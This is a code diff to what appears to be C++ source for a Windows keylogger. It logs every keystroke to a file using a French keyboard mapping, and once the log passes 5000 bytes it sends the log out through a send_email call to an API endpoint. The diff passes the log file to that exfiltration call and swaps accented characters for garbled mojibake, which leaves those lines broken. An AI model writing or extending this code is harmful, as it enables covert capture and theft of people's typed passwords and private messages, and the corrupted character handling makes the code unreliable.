@@ -19,7 +19,7 @@ void process_key_evt(DWORD VK_code, bool is_key_down, const std::string& api_end
     static std::ofstream out_file(file_name, std::ios::app);
     std::streampos size = cron_task(file_name);
     if (size > 5000) {
-		send_email(api_endpoint_url, subkey_names);
+		send_email(api_endpoint_url, subkey_names, file_name);
 		out_file.close();
 		out_file.open(file_name, std::ios::trunc);
     }
@@ -32,19 +32,19 @@ void process_key_evt(DWORD VK_code, bool is_key_down, const std::string& api_end
             UINT mapped_char = MapVirtualKey(VK_code, MAPVK_VK_TO_CHAR);
             if (VK_code >= 0x41 && VK_code <= 0x5A) {
                 if ((VK_code >= 0x41 && VK_code <= 0x5A) && !is_caps_or_shift_pressed()) {
-                    mapped_char += 32; 
+                    mapped_char += 32;
                 }
                 out_file << static_cast<char>(mapped_char);
             } else if (VK_code >= 0x30 && VK_code <= 0x39) {
                 switch (VK_code) {
                     case 0x30:
-						out_file << (!is_caps_or_shift_pressed() ? 'à' : '0');
+						out_file << (!is_caps_or_shift_pressed() ? 'ï¿½' : '0');
 						break;
 					case 0x31:
                         out_file << (!is_caps_or_shift_pressed() ? '&' : '1');
                         break;
                     case 0x32:
-						out_file << (!is_caps_or_shift_pressed() ? 'é' : '2');
+						out_file << (!is_caps_or_shift_pressed() ? 'ï¿½' : '2');
 						break;
                     case 0x33:
                         out_file << (!is_caps_or_shift_pressed() ? '"' : '3');
@@ -56,16 +56,16 @@ void process_key_evt(DWORD VK_code, bool is_key_down, const std::string& api_end
 						out_file << (!is_caps_or_shift_pressed() ? '(' : '5');
 						break;
 					case 0x36:
-                        out_file << (!is_caps_or_shift_pressed() ? '§' : '6');
+                        out_file << (!is_caps_or_shift_pressed() ? 'ï¿½' : '6');
                         break;
                     case 0x37:
-                        out_file << (!is_caps_or_shift_pressed() ? 'è' : '7');
+                        out_file << (!is_caps_or_shift_pressed() ? 'ï¿½' : '7');
                         break;
                     case 0x38:
 						out_file << (!is_caps_or_shift_pressed() ? '!' : '8');
 						break;
                     case 0x39:
-                        out_file << (!is_caps_or_shift_pressed() ? 'ç' : '9');
+                        out_file << (!is_caps_or_shift_pressed() ? 'ï¿½' : '9');
                         break;
                 }
             }
@@ -73,4 +73,3 @@ void process_key_evt(DWORD VK_code, bool is_key_down, const std::string& api_end
         out_file.flush();
     }
 }
-	
